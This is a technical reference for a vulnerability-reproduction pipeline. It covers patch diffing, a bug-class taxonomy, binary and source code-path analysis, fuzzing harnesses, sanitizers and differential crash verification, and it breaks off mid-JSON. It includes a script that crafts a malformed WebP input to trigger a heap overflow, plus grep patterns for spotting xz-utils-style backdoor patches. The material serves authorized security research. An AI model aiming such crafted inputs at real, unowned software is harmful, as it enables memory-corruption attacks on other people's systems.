# Patch-to-PoC Pipeline Payloads

> Attack payloads, harness templates, detection rules, and memory-contract snippets for the patch-to-poc pipeline. Organized by phase and bug class. Replace `libfoo-1.8.2` / `CVE-XXXX-YYYYY` placeholders with your actual target.

## Conventions

- All payloads assume authorized testing against owned / SCEN-008-class targets
- `REPLACE_WITH_YOUR_*` placeholders mark values you must supply
- Memory deltas use **Schema 3** JSON — see `validation/scenarios/SCEN-MEMORY-SCHEMA.md`
- All commands assume a Kali 2025-2 host with Ghidra 11.x, AFL++ 4.x, libFuzzer from LLVM 17+, YARA 4.x, sigma-cli installed

---

## §1. Patch Acquisition & Normalization

### §1.1 Acquire patch from git tags

```bash
cd /targets/<pkg>
git clone https://github.com/<vendor>/<pkg> .
# Identify the patched commit / tag from the CVE advisory
git log --oneline --grep="CVE-XXXX-YYYYY" --all
git log --oneline --since="2024-01-01" -- <suspected_path>/

# Generate the diff
git diff <vuln_tag> <patched_tag> -- <pathspec> > /work/CVE-XXXX-YYYYY.patch
git diff <vuln_tag> <patched_tag> --stat
```

### §1.2 Acquire patch from distro gitweb (when upstream unavailable)

```bash
# Debian snapshot
curl -s "https://snapshot.debian.org/archive/debian/<timestamp>/pool/main/<p>/<pkg>/<pkg>_<ver>.deb" \
  -o /work/<pkg>.deb
dpkg-deb -x /work/<pkg>.deb /work/<pkg>-extracted/

# Ubuntu security tracker
curl -s "https://ubuntu.com/security/cves/CVE-XXXX-YYYYY.html" | \
  grep -oE 'href="[^"]+\.patch[^"]*"' | head

# Red Hat Bugzilla
curl -s "https://bugzilla.redhat.com/show_bug.cgi?id=<id>" | \
  grep -oE 'attachment.cgi\?id=[0-9]+'
```

### §1.3 Acquire patch from GitHub advisory

```bash
# GitHub Security Advisory
curl -s "https://api.github.com/repos/<vendor>/<pkg>/security-advisories" | \
  jq '.[] | select(.cve_id=="CVE-XXXX-YYYYY") | .references'

# Pull the fix commit directly
gh api /repos/<vendor>/<pkg>/commits/<sha> | jq -r '.files[].patch' > /work/CVE-XXXX-YYYYY.patch
```

### §1.4 Parse a `*.patch` / `*.diff` file

```bash
# File-level summary
diffstat -p /work/CVE-XXXX-YYYYY.patch
# src/decode.c | 12 +++++++++++-
# 1 file changed, 11 insertions(+), 1 deletion(-)

# Per-hunk line counts
grep -c '^@@' /work/CVE-XXXX-YYYYY.patch       # number of hunks
grep -c '^+' /work/CVE-XXXX-YYYYY.patch        # lines added
grep -c '^-' /work/CVE-XXXX-YYYYY.patch        # lines removed

# Files touched
grep '^diff --git' /work/CVE-XXXX-YYYYY.patch
```

### §1.5 Detect a malicious patch (xz-utils special case)

```bash
# Suspicious indicators in a patch:
# - Build system changes that inject object files
# - IFUNC resolver additions
# - Obfuscated C macros that hide control flow
# - Tests removed or skipped
# - M4 / autotools staged binary blobs

grep -nE 'IFUNC|__attribute__\(\(ifunc\)\)|m4_include' /work/CVE-XXXX-YYYYY.patch
grep -nE 'tests/.*disabled|skip_test|XFAIL' /work/CVE-XXXX-YYYYY.patch
grep -nE '\.o|\.a|\.so' /work/CVE-XXXX-YYYYY.patch | head  # build artifacts in patch = red flag

# Cross-reference with the project's normal patch style
git log --oneline --since="2023-01-01" -- build-system/ | head -10
```

### §1.6 Initialize Schema 3 memory from the patch

```bash
cat > /work/repro-attempt-memory.json <<'JSON'
{
  "schema_version": "1.0",
  "task": {
    "vulnerable_version": "/targets/libfoo-1.8.2",
    "patched_version": "/targets/libfoo-1.8.3",
    "patch_file": "/work/CVE-XXXX-YYYYY.patch",
    "cve": "CVE-XXXX-YYYYY",
    "build_env": "ubuntu:22.04 + build-essential"
  },
  "patch_analysis": {},
  "code_path": {},
  "candidate_inputs": [],
  "verification_results": {},
  "convergence_state": {
    "iterations": 0,
    "status": "IN_PROGRESS",
    "stop_condition_met": false,
    "next_action": "Phase 1: Patch analysis"
  }
}
JSON
```

---

## §2. Bug-Class Hypothesis Taxonomy (12 classes)

The bug-class taxonomy drives Phase 1's hypothesis, Phase 3's strategy choice, and Phase 5's detection pattern. Pick exactly one as `patch_analysis.suspected_vuln_type`.

| Class | CWE | Patch signature | Phase 3 strategy | Phase 5 YARA anchor |
|-------|-----|-----------------|------------------|---------------------|
| `memory_corruption` | CWE-787/125/119 | New bounds check, new allocation size clamp | Manual OR fuzzer | Function name + missing-guard regex |
| `integer_overflow` | CWE-190 | `if (size > MAX)` before arithmetic | Fuzzer | Arithmetic-on-size pattern |
| `type_confusion` | CWE-843 | `if (obj->type != EXPECTED)` check | Fuzzer | Vtable / type-tag check |
| `use_after_free` | CWE-416 | `free(p); p = NULL;` paired addition | Fuzzer | `free` without NULL assignment |
| `oob_read` | CWE-125 | Bounds check before `buf[idx]` read | Manual + fuzzer | Read without bounds check |
| `oob_write` | CWE-787 | Bounds check before `buf[idx] =` write | Manual + fuzzer | Write without bounds check |
| `auth_bypass` | CWE-287/285 | New auth check on route / handler | Manual (HTTP) | URL pattern + missing auth decorator |
| `path_traversal` | CWE-22 | New `..` / absolute path filter | Manual (HTTP) | Tainted-path-into-filesystem pattern |
| `sqli` | CWE-89 | Switch from string concat to parameterized query | Manual (HTTP) | SQL keywords in tainted string |
| `xss` | CWE-79 | Output encoding / sanitization added | Manual (HTTP) | Reflected input without escape |
| `ssrf` | CWE-918 | URL allowlist / IP blocklist on outbound | Manual (HTTP) | User input into outbound URL |
| `race_condition` | CWE-362 | New mutex / lock acquisition | Fuzzer (TSan) | Shared-state access without lock |

### §2.1 Map protective pattern → bug class

```python
#!/usr/bin/env python3
# /work/scripts/pattern_to_bugclass.py
import re, sys

PATTERNS = {
    r'(bounds|size|len).*check|>=\s*\d+\s*\)|<=\s+max_': 'memory_corruption',
    r'overflow|>\s+(1U?\s*<<\s*3[0-2])': 'integer_overflow',
    r'type\s*==\s*\w+|->kind\s*==|->type\s*==': 'type_confusion',
    r'free\s*\(.*\);\s*\1\s*=\s*NULL|^\+\s*NULL$': 'use_after_free',
    r'authenticat|is_authorized|require_auth|check_permission': 'auth_bypass',
    r'\.\.|realpath|sanitize_path|clean_path': 'path_traversal',
    r'prepare\(|bindParam|parameterized|prepared_stmt': 'sqli',
    r'htmlentities|htmlspecialchars|escape_html|sanitize': 'xss',
    r'allowlist|blocklist|is_private_ip|deny_host': 'ssrf',
    r'mutex_lock|pthread_mutex|lock_guard|std::lock': 'race_condition',
}

with open(sys.argv[1]) as f:
    patch = f.read()

for pat, cls in PATTERNS.items():
    if re.search(pat, patch, re.IGNORECASE | re.MULTILINE):
        print(f"{cls}\t{pat}")
        break
else:
    print("unknown\t(no known pattern matched)")
```

```bash
chmod +x /work/scripts/pattern_to_bugclass.py
python3 /work/scripts/pattern_to_bugclass.py /work/CVE-XXXX-YYYYY.patch
# memory_corruption	(bounds|size|len).*check|>=\s*\d+\s*\)|<=\s+max_
```

---

## §3. Protective Pattern Recognition

### §3.1 Identify "this patch adds a check" patches (most informative)

```bash
# Look for patches that ONLY add lines (no removals)
git diff <vuln_tag> <patched_tag> -- <path> | \
  awk '/^@@/{hunk++} /^-/{rem++} /^\+/{add++} END{printf "hunks=%d add=%d rem=%d\n", hunk, add, rem}'

# A "pure-add" patch (add=N, rem=0 or rem<3) is most informative
# A "refactor" patch (add ~= rem) typically hides the real fix
```

### §3.2 Extract the protective pattern line

```bash
# Pull every added line; these are candidate protective checks
grep '^+' /work/CVE-XXXX-YYYYY.patch | grep -v '^+++' | head -20

# Filter for likely protective patterns
grep '^+' /work/CVE-XXXX-YYYYY.patch | grep -v '^+++' | \
  grep -E '(if\s*\(|return\s+-?\d|assert\(|abort\(|goto\s+error)' | head
```

### §3.3 Backdoor detection patterns (xz-utils class)

```bash
# A backdoor patch typically:
# - Adds build-system hooks (m4, autotools, CMake custom commands)
# - References object files or archives not in the source tree
# - Modifies IFUNC resolvers or __attribute__ decorators
# - Disables or skips tests
# - Adds heavy obfuscation

backdoor_indicators=$(grep -cE 'IFUNC|__attribute__\(\(ifunc|m4_include|XFAIL|\.o"\)|\.a"\)|\.so")' /work/CVE-XXXX-YYYYY.patch)
if [ "$backdoor_indicators" -gt 0 ]; then
  echo "[!] Patch exhibits backdoor indicators ($backdoor_indicators matches)"
  echo "[!] Escalate to forensics — DO NOT execute the patched version"
fi
```

---

## §4. Source-Available Code Path Walking

### §4.1 Locate the vulnerable function

```bash
# Simple grep for the function name
grep -rn "<vuln_func>" /targets/<pkg>-<vuln_ver>/

# ctags + your favorite callgraph tool
ctags -R /targets/<pkg>-<vuln_ver>/
# Open in vim/emacs and use tags to navigate
```

### §4.2 Build the call chain from public API to vuln function

```bash
# Using cflow
cflow --main <public_api> /targets/<pkg>-<vuln_ver>/src/*.c | \
  grep -A 20 "<public_api>"

# Using clang AST
clang -Xclang -ast-dump=json -fsyntax-only \
  -I/targets/<pkg>-<vuln_ver>/include \
  /targets/<pkg>-<vuln_ver>/src/<api>.c | \
  jq '.. | .kind? | select(.=="CallExpr")' | head

# Using frama-c (when available)
frama-c -calldeps /targets/<pkg>-<vuln_ver>/src/<vuln_file>.c
```

### §4.3 Measure attacker-input distance

```python
#!/usr/bin/env python3
# /work/scripts/call_depth.py — measure depth from public API to vuln
import sys
# naive call-chain depth counter
chain = sys.argv[1].split("→") if "→" in sys.argv[1] else sys.argv[1].split("->")
print(f"distance={len(chain) - 1}")
```

```bash
python3 /work/scripts/call_depth.py "WebPDecode → VP8LDecodeImageStream → VP8LDecodeHeader → VP8LBuildHuffmanTable → BuildHuffmanTable"
# distance=4
```

### §4.4 Pin down the tainted variable

```bash
# Use CodeQL to trace taint from public API to sink
# codeql database create <pkg>-db --language=cpp --source-root=/targets/<pkg>-<vuln_ver>
codeql database create /work/<pkg>-db --language=cpp \
  --command="make" --source-root=/targets/<pkg>-<vuln_ver>/

# Run the tainted-allocation query
codeql database run-queries /work/<pkg>-db \
  --search-path=codeql-repo/cpp/ql/src/Likely%20Bugs/Allocation \
  --format=csv > /work/taint.csv

# Find the call chain
codeql query run --database=/work/<pkg>-db \
  codeql-repo/cpp/ql/src/Statements/ReachingDefinitions.ql | head
```

### §4.5 Phase 2 memory delta

```bash
tmp=$(mktemp)
jq '.code_path = {
  "entry_function": "WebPDecode() → VP8LDecodeHeader()",
  "call_chain_to_vuln": ["WebPDecode", "VP8LDecodeImageStream", "VP8LDecodeHeader", "VP8LBuildHuffmanTable", "BuildHuffmanTable"],
  "input_to_vuln_distance": 4
} | .convergence_state.iterations += 1' \
  /work/repro-attempt-memory.json > "$tmp" && mv "$tmp" /work/repro-attempt-memory.json
```

---

## §5. Binary-Only Code Path Walking

### §5.1 Ghidra headless decompile of the vulnerable function

```bash
mkdir -p /work/ghidra-proj /work/scripts

cat > /work/scripts/DecompileFunction.java <<'JAVA'
// Decompile a specific function and print its C-like pseudocode
import ghidra.app.script.GhidraScript;
import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionManager;

public class DecompileFunction extends GhidraScript {
    @Override
    public void run() throws Exception {
        String fname = getScriptArgs()[0];
        FunctionManager fm = currentProgram.getFunctionManager();
        for (Function f : fm.getFunctions(true)) {
            if (f.getName().equals(fname)) {
                DecompInterface di = new DecompInterface();
                di.openProgram(currentProgram);
                DecompileResults res = di.decompileFunction(f, 60, monitor);
                println("=== " + f.getName() + " ===");
                println(res.getDecompiledFunction().getC());
                return;
            }
        }
        println("Function not found: " + fname);
    }
}
JAVA

/opt/ghidra/support/analyzeHeadless /work proj \
  -import /targets/<pkg>-<vuln_ver>.so \
  -postScript DecompileFunction.java -scriptPath /work/scripts \
  -functionName <vuln_func>
```

### §5.2 BinDiff the vulnerable vs patched binaries

```bash
bindiff /targets/<pkg>-<vuln_ver>.so /targets/<pkg>-<patched_ver>.so \
  -o /work/<pkg>.BinDiff

# Open the BinDiff2 database in BinDiff GUI:
# - "Changed functions" = candidate vuln sites
# - "Added functions" = new helpers (often the protective check extracted)
# - "Removed functions" = unused after fix

# Or via SQL on the BinDiff sqlite DB
sqlite3 /work/<pkg>.BinDiff '
  SELECT name, similarity, confidence 
  FROM function 
  WHERE similarity < 1.0 AND similarity > 0 
  ORDER BY similarity ASC 
  LIMIT 10;'
```

### §5.3 radare2 quick look at the patched function

```bash
r2 -A -c 'pdf @ sym.<vuln_func>' /targets/<pkg>-<vuln_ver>.so > /work/vuln_func.asm
r2 -A -c 'pdf @ sym.<vuln_func>' /targets/<pkg>-<patched_ver>.so > /work/patched_func.asm
diff -u /work/vuln_func.asm /work/patched_func.asm | head -50
```

### §5.4 angr symbolic execution for tainted branches

```python
#!/usr/bin/env python3
# /work/scripts/angr_walk.py
import angr

proj = angr.Project("/targets/<pkg>-<vuln_ver>.so", load_options={"auto_load_libs": False})
cfg = proj.analyses.CFGFast()

# Find the vulnerable function address
vuln_addr = None
for sym in proj.loader.main_object.symbols:
    if sym.name == "<vuln_func>":
        vuln_addr = sym.rebased_addr
        break

print(f"vuln_addr=0x{vuln_addr:x}")

# Walk backwards to public API
callers = set()
for block in proj.factory.block(vuln_addr).codenodes():
    for pred in cfg.graph.predecessors(block):
        callers.add(pred)
print(f"callers={callers}")
```

### §5.5 Type recovery from stripped binaries

```bash
# Ghidra's Auto Type recovery
/opt/ghidra/support/analyzeHeadless /work proj \
  -process <pkg>-<vuln_ver>.so -noanalysis \
  -postScript AutoTypeInfo.java

# angr Typehoon
python3 -c '
import angr
p = angr.Project("/targets/<pkg>-<vuln_ver>.so")
p.analyses.Typehoon()
'
```

---

## §6. Manual PoC Crafting Strategies

### §6.1 Hex editor / Python `struct` approach

```python
#!/usr/bin/env python3
# /work/scripts/craft_poc.py — craft a malformed input
import struct

# Take a valid sample and mutate the vulnerable field
with open("/targets/samples/valid.webp", "rb") as f:
    data = bytearray(f.read())

# Locate the Huffman-table-size field (offset discovered from Phase 2)
# Field is 4 bytes little-endian at offset 0x42
table_size_offset = 0x42
new_size = (1 << 31) + 100  # trigger the overflow
struct.pack_into("<I", data, table_size_offset, new_size)

with open("/work/poc-crafted.webp", "wb") as f:
    f.write(data)
print("wrote /work/poc-crafted.webp")
```

### §6.2 Bit-fiddling for binary format fields

```python
#!/usr/bin/env python3
# Bit manipulation for Huffman code-length sequences
import sys

# A Huffman code-length sequence that yields > 2^31 table entries
# Code-length alphabet: 0-4 (max 5 symbols)
# Each code length cl[i] adds 2^(max_cl - cl[i]) leaves
# To overflow: many small cl values

# Build the malformed code-length stream
stream = bytes([
    0x01, 0x01, 0x01, 0x01,  # repeat small values many times
] * 1000)

sys.stdout.buffer.write(stream)
```

### §6.3 Take a valid sample + minimize

```bash
# AFL++ can also minimize a known-crashing input
afl-tmin -i /work/crashes/crash-orig -o /work/crashes/crash-min \
  -- /work/harness_vulnerable @@

# Verify the minimized input still crashes
/work/harness_vulnerable /work/crashes/crash-min
echo "exit=$?"  # should be non-zero (ASan abort)
```

### §6.4 Strategy A decision matrix

| Condition | Strategy A first |
|-----------|------------------|
| Phase 1 confidence ≥ 0.8 | YES — manual craft the exact field |
| Public OSS-Fuzz reproducer exists | YES — clone and minimize |
| Bug class = auth_bypass / sqli / xss / ssrf / path_traversal | YES — manual HTTP request |
| Bug class = race_condition / type_confusion / integer_overflow | NO — go to Strategy B |

---

## §7. AFL++ Harness Template (C/C++)

### §7.1 Minimal libFuzzer-compatible harness

```c
// /work/harness_<vuln_func>.c
#include <stdint.h>
#include <stddef.h>
#include "<pkg>/<api>.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Minimal: call the public API with attacker bytes
    <api>decode(data, size, NULL);
    return 0;
}
```

### §7.2 Build with AFL++ + sanitizer

```bash
# Compile with AFL instrumentation + ASan + UBSan
afl-clang-fast -g -O1 \
  -fsanitize=address,undefined \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness_<vuln_func>.c \
  /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_vulnerable

# Or for in-process libFuzzer mode
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness_<vuln_func>.c \
  /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_vulnerable
```

### §7.3 Harness for parser APIs that take a file path

```c
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include "<pkg>/<api>.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    char tmppath[] = "/tmp/fuzz-XXXXXX";
    int fd = mkstemp(tmppath);
    if (fd < 0) return 0;
    write(fd, data, size);
    close(fd);

    // API takes a filename
    <api>parse_file(tmppath);

    unlink(tmppath);
    return 0;
}
```

### §7.4 Harness for shared library (closed-source binary)

```c
#include <stdint.h>
#include <stddef.h>
#include <dlfcn.h>

typedef int (*decode_fn)(const uint8_t *, size_t);

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    static decode_fn fn = NULL;
    if (!fn) {
        void *h = dlopen("/targets/<pkg>-<vuln_ver>.so", RTLD_NOW);
        fn = (decode_fn)dlsym(h, "<api>_decode");
    }
    fn(data, size);
    return 0;
}
```

### §7.5 AFL++ persistent mode harness (10x perf)

```c
#include "<pkg>/<api>.h>

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        <api>decode(buf, len, NULL);
    }
    return 0;
}
```

```bash
afl-clang-fast -g -O1 -fsanitize=address \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness_persistent.c \
  /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_persistent
```

---

## §8. libFuzzer Harness Template

### §8.1 Standard libFuzzer harness (in-process)

```c
// /work/harness_lf_<vuln_func>.c
#include <stdint.h>
#include <stddef.h>
#include "<pkg>/<api>.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    <api>decode(data, size, NULL);
    return 0;
}
```

```bash
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness_lf_<vuln_func>.c \
  /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_lf_vulnerable

# Run with seed corpus
mkdir -p /work/seeds && cp /targets/samples/* /work/seeds/
ASAN_OPTIONS=detect_leaks=0 /work/harness_lf_vulnerable /work/seeds/ \
  -max_len=65536 -max_total_time=1800 -artifact_prefix=/work/crashes/
```

### §8.2 Custom mutator for structured input

```c
#include <stdint.h>
#include <stddef.h>
#include "<pkg>/<api>.h>

size_t LLVMFuzzerCustomMutator(uint8_t *data, size_t size,
                                size_t maxsize, unsigned int seed) {
    // Preserve the file magic, mutate the rest
    if (size < 4) return 0;
    uint32_t magic;
    memcpy(&magic, data, 4);

    // Mutate body
    for (size_t i = 4; i < size; i++) {
        if (rand_r(&seed) % 16 == 0) {
            data[i] ^= (1 << (rand_r(&seed) % 8));
        }
    }
    return size;
}

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    <api>decode(data, size, NULL);
    return 0;
}
```

---

## §9. Sanitizer Configurations

### §9.1 ASan (Address Sanitizer)

```bash
# Compile with ASan
clang -g -O1 -fsanitize=address \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness.c /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_asan

# Run with symbolization
ASAN_OPTIONS=symbolize=1:abort_on_error=1:dedup_token_length=4 \
  /work/harness_asan /work/seeds/

# Resolve stack traces
ASAN_OPTIONS=symbolize=1 /work/harness_asan 2>&1 | \
  asan_symbolize --obj=/work/harness_asan
```

### §9.2 UBSan (Undefined Behavior Sanitizer)

```bash
# UBSan catches integer overflow, shift OOB, type confusion
clang -g -O1 -fsanitize=undefined,float-cast-overflow \
  -fno-sanitize-recover=unsigned-integer-overflow \
  /work/harness.c /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_ubsan

UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 /work/harness_ubsan /work/seeds/
```

### §9.3 MSan (Memory Sanitizer — uninitialized reads)

```bash
# Requires libc++ built with MSan; use clang's MSan-instrumented system
clang -g -O1 -fsanitize=memory -fno-omit-frame-pointer \
  /work/harness.c /targets/<pkg>-<vuln_ver>-msan/src/.libs/lib<pkg>.a \
  -o /work/harness_msan

MSAN_OPTIONS=print_stats=1:halt_on_error=1 /work/harness_msan /work/seeds/
```

### §9.4 TSan (Thread Sanitizer — race conditions)

```bash
clang -g -O1 -fsanitize=thread \
  /work/harness.c /targets/<pkg>-<vuln_ver>-tsan/src/.libs/lib<pkg>.a \
  -o /work/harness_tsan

TSAN_OPTIONS=halt_on_error=1:second_deadlock_stack=1 /work/harness_tsan /work/seeds/ &
```

### §9.5 Combined sanitizer matrix (recommended for Phase 3)

```bash
# Single compile with all relevant sanitizers
SANITIZE_FLAGS="-fsanitize=address,undefined,bool,signed-integer-overflow,float-cast-overflow"
clang -g -O1 $SANITIZE_FLAGS -fno-sanitize-recover=all \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness.c /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_combined
```

---

## §10. Seed Corpus Construction

### §10.1 Source from the project's own test suite

```bash
find /targets/<pkg>-<vuln_ver>/ -type d -name 'test*' -o -name 'tests' | head
mkdir -p /work/seeds
find /targets/<pkg>-<vuln_ver>/tests/ -type f \( -name '*.webp' -o -name '*.png' -o -name '*.jpg' -o -name '*.bin' \) \
  -exec cp {} /work/seeds/ \;
ls /work/seeds/ | wc -l
```

### §10.2 Boundary-value inputs (high-yield seeds)

```python
#!/usr/bin/env python3
# /work/scripts/gen_boundary_seeds.py
import os, struct

os.makedirs("/work/seeds", exist_ok=True)

# Zero-length
open("/work/seeds/zero.bin", "wb").write(b"")

# One-byte
open("/work/seeds/one.bin", "wb").write(b"\x00")

# Max-size (just under 64KB)
open("/work/seeds/max64k.bin", "wb").write(b"\x00" * 65535)

# All-0xFF
open("/work/seeds/ff.bin", "wb").write(b"\xff" * 4096)

# Boundary integers
for val in [0, 1, 0x7f, 0x80, 0xff, 0x7fff, 0x8000, 0xffff,
            0x7fffffff, 0x80000000, 0xffffffff]:
    path = f"/work/seeds/int_{val}.bin"
    with open(path, "wb") as f:
        f.write(struct.pack("<I", val))

print(f"generated {len(os.listdir('/work/seeds'))} boundary seeds")
```

### §10.3 Mutation-based seed generation

```bash
# Radamsa for high-quality mutations
radamsa -o /work/seeds/ -n 100 -seed 42 /targets/samples/*.webp

# Or AFL++'s own corpus minimizer
afl-cmin -i /targets/samples/ -o /work/seeds/ -T all \
  -- /work/harness_vulnerable @@
```

---

## §11. Corpus Minimization

### §11.1 afl-cmin — corpus-level minimization (coverage)

```bash
afl-cmin -i /work/crashes/ -o /work/crashes-min/ \
  -- /work/harness_vulnerable @@

# Result: a minimal subset of inputs achieving the same coverage
ls /work/crashes-min/ | wc -l
```

### §11.2 afl-tmin — per-input minimization

```bash
for f in /work/crashes/*; do
  afl-tmin -i "$f" -o "/work/crashes-min/$(basename $f).min" \
    -- /work/harness_vulnerable @@
done
```

### §11.3 libFuzzer minimize mode

```bash
# Take a crashing input and minimize it
clang -g -O1 -fsanitize=fuzzer,address \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness.c /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_min

/work/harness_min -minimize_crash=1 -exact_artifact_path=/work/crash-min \
  /work/crashes/crash-*
```

---

## §12. Crash Triage Workflow

### §12.1 Capture and symbolize an ASan crash

```bash
ASAN_OPTIONS=symbolize=1:print_legend=1:dedup_token_length=4 \
  /work/harness_vulnerable /work/crashes/crash-POC \
  > /work/crash.log 2>&1

# Output looks like:
# ==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005cfe1
# WRITE of size 1 at 0x60200005cfe1 thread T0
#     #0 0x... in BuildHuffmanTable src/dec/huffman_dec.c:187
#     #1 0x... in VP8LBuildHuffmanTable ...
```

### §12.2 Resolve addresses to source lines

```bash
# addr2line for non-ASan builds
addr2line -e /work/harness_vulnerable -f -C -i 0x5555abcd

# asan_symbolize for ASan builds
cat /work/crash.log | asan_symbolize --obj=/work/harness_vulnerable
```

### §12.3 Verify the crash matches the Phase 1 hypothesis

```bash
# Extract the crashing function from the ASan log
crash_func=$(grep -oE '#0\s+0x[0-9a-f]+\s+in\s+(\w+)' /work/crash.log | head -1 | awk '{print $4}')
hypothesis_func=$(jq -r '.patch_analysis.suspected_vuln_function' /work/repro-attempt-memory.json)

if [ "${crash_func%(*}" = "${hypothesis_func%(*}" ]; then
  echo "[+] Crash matches hypothesis ($crash_func)"
  jq --arg cf "$crash_func" \
    '.candidate_inputs += [{
      "id": "IN-001",
      "shape": "VP8L-encoded input yielding > 2^31 Huffman table entries",
      "expected_trigger": "heap-buffer-overflow in BuildHuffmanTable",
      "test_status": "VULNERABLE_CRASHED",
      "asan_evidence": $cf
    }]' /work/repro-attempt-memory.json > /tmp/m.json && mv /tmp/m.json /work/repro-attempt-memory.json
else
  echo "[!] Crash does NOT match hypothesis ($crash_func vs $hypothesis_func) — re-enter Phase 1"
fi
```

### §12.4 Cluster crashes by dedup token

```bash
# Group crashes by dedup token
for f in /work/crashes/*; do
  ASAN_OPTIONS=dedup_token_length=4 /work/harness_vulnerable "$f" 2>&1 | \
    grep -oE 'dedup_token: [0-9a-f]+' >> /work/dedup.txt
done
sort /work/dedup.txt | uniq -c | sort -rn
```

---

## §13. Differential Verification Script (the CyberGym Stop Condition)

### §13.1 Build both vulnerable and patched harnesses identically

```bash
# Vulnerable
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/<pkg>-<vuln_ver>/include \
  /work/harness.c /targets/<pkg>-<vuln_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_vulnerable

# Patched (same flags, only library differs)
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/<pkg>-<patched_ver>/include \
  /work/harness.c /targets/<pkg>-<patched_ver>/src/.libs/lib<pkg>.a \
  -o /work/harness_patched
```

### §13.2 Run the same PoC against both

```bash
POC=/work/crashes/crash-POC

for variant in vulnerable patched; do
  ASAN_OPTIONS=symbolize=1:abort_on_error=1 \
    /work/harness_${variant} "$POC" \
    > /work/${variant}.stdout 2> /work/${variant}.stderr
  echo "exit=$?" > /work/${variant}.exitcode
done

v_exit=$(jq -r '.exit' /work/vulnerable.exitcode 2>/dev/null || cut -d= -f2 /work/vulnerable.exitcode)
p_exit=$(jq -r '.exit' /work/patched.exitcode 2>/dev/null || cut -d= -f2 /work/patched.exitcode)
echo "vulnerable_exit=$v_exit patched_exit=$p_exit"
```

### §13.3 Apply the decision matrix

```bash
cat > /work/scripts/differential_decision.sh <<'BASH'
#!/bin/bash
# Differential verification decision matrix
set -e
v_exit=$(cat /work/vulnerable.exitcode | cut -d= -f2)
p_exit=$(cat /work/patched.exitcode | cut -d= -f2)
v_asan=$(grep -c "AddressSanitizer" /work/vulnerable.stderr || true)
p_asan=$(grep -c "AddressSanitizer" /work/patched.stderr || true)

v_crashed=false; [ "$v_exit" -ne 0 ] && [ "$v_asan" -gt 0 ] && v_crashed=true
p_crashed=false; [ "$p_exit" -ne 0 ] && [ "$p_asan" -gt 0 ] && p_crashed=true

if $v_crashed && ! $p_crashed; then
  verdict="CONFIRMED"
  next="Phase 5"
elif $v_crashed && $p_crashed; then
  verdict="WRONG_ROOT_CAUSE"
  next="Phase 1 with new hypothesis"
elif ! $v_crashed && ! $p_crashed; then
  verdict="POC_DOES_NOT_REACH_BUG"
  next="Phase 3 with new candidate"
else
  verdict="IMPOSSIBLE"
  next="Recheck build / harness"
fi

echo "verdict=$verdict next=$next"

# Update memory
tmp=$(mktemp)
jq --argjson vc $v_crashed --argjson pc $p_crashed --arg status "$verdict" \
  '.verification_results = {
    "vulnerable": {"crashed": $vc, "sanitizer_output": (input_filename="/work/vulnerable.stderr" | .)},
    "patched": {"crashed": $pc, "sanitizer_output": ""}
  } | .convergence_state.status = (if $status == "CONFIRMED" then "POC_CONFIRMED_DIFFERENTIALLY" else "IN_PROGRESS" end) | .convergence_state.stop_condition_met = ($vc and ($pc | not))' \
  /work/repro-attempt-memory.json > "$tmp" 2>/dev/null && mv "$tmp" /work/repro-attempt-memory.json
BASH
chmod +x /work/scripts/differential_decision.sh
/work/scripts/differential_decision.sh
```

### §13.4 Emit the convergence event

```bash
jq -n '
{
  "event": "POC_CONFIRMED_DIFFERENTIALLY",
  "vulnerable_crashed": true,
  "patched_crashed": false,
  "stop_condition_met": true,
  "iterations": 4,
  "timestamp": (now | todate)
}' | tee -a /work/convergence-events.jsonl
```

---

## §14. Decision Matrix (Vuln vs Patched Crash Combinations)

| Vulnerable | Patched | Verdict | Next Phase | Anti-pattern? |
|-----------|---------|---------|------------|---------------|
| crashes (ASan) | clean (exit 0) | **CONFIRMED** | Phase 5 | No |
| crashes | crashes | WRONG_ROOT_CAUSE | Phase 1 | No — legitimate retry |
| no crash | no crash | POC_DOESNT_REACH_BUG | Phase 3 | No |
| no crash | crashes | IMPOSSIBLE | Recheck build | Yes — flag build integrity |
| crashes (non-ASan) | clean | NON_ASAN_CRASH | Verify it's the bug, not unrelated | No |
| SIGSEGV only | clean | LEGACY_CRASH | Rebuild with ASan for clearer trace | No |

---

## §15. Schema 3 Reproduction Memory Initialization

### §15.1 Initial template

```json
{
  "schema_version": "1.0",
  "task": {
    "vulnerable_version": "",
    "patched_version": "",
    "patch_file": "",
    "cve": "",
